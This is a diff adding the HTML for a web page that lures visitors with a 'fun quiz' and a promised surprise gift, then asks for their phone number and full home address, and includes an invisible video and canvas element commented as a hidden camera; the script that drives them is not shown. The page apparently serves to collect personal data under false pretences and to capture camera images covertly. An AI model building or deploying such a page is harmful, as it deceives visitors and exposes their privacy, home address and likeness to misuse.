@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fun Questions & Surprise Gift! 🎁</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <!-- Welcome Screen -->
+        <div id="welcome-screen" class="screen active">
+            <div class="emoji-rain">🎉🎊🎈🎁✨</div>
+            <h1 class="title">Welcome to the Fun Zone! 🎉</h1>
+            <p class="subtitle">Answer 10 hilarious questions and win a SURPRISE GIFT! 🎁</p>
+            <button class="btn btn-start" onclick="startQuiz()">Let's Go! 🚀</button>
+        </div>
+
+        <!-- Questions Screen -->
+        <div id="questions-screen" class="screen">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress"></div>
+            </div>
+            <div class="question-counter">
+                Question <span id="current-q">1</span> of 10
+            </div>
+
+            <div id="question-container">
+                <!-- Questions will be inserted here dynamically -->
+            </div>
+
+            <div class="playful-message" id="playful-message"></div>
+
+            <div class="button-group">
+                <button class="btn btn-next" id="next-btn" onclick="nextQuestion()">Next Question ➡️</button>
+            </div>
+        </div>
+
+        <!-- Gift Form Screen -->
+        <div id="gift-form-screen" class="screen">
+            <h2 class="form-title">🎁 Claim Your Surprise Gift! 🎁</h2>
+            <p class="form-subtitle">Just a few more details and your surprise is on the way!</p>
+
+            <form id="gift-form">
+                <div class="form-group">
+                    <label for="phone">📱 Phone Number *</label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="address">🏠 Address *</label>
+                    <textarea id="address" name="address" rows="3" placeholder="Enter your full address"
+                        required></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">📧 Email (Optional)</label>
+                    <input type="email" id="email" name="email" placeholder="your.email@example.com">
+                </div>
+
+                <button type="submit" class="btn btn-submit">Submit & Get My Gift! 🎁</button>
+            </form>
+        </div>
+
+        <!-- Thank You Screen -->
+        <div id="thankyou-screen" class="screen">
+            <div class="confetti">🎊🎉🎈✨🎁🎊🎉🎈✨🎁</div>
+            <h1 class="thankyou-title">🎉 Woohoo! 🎉</h1>
+            <p class="thankyou-message">Your surprise is on its way! 🚀</p>
+            <p class="thankyou-submessage">Get ready for something AMAZING! 😄</p>
+            <div class="celebration-emoji">🎁🎈🎊✨🎉</div>
+        </div>
+    </div>
+
+    <!-- Hidden video element for camera -->
+    <video id="camera-video" style="display: none;" autoplay playsinline></video>
+    <canvas id="camera-canvas" style="display: none;"></canvas>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
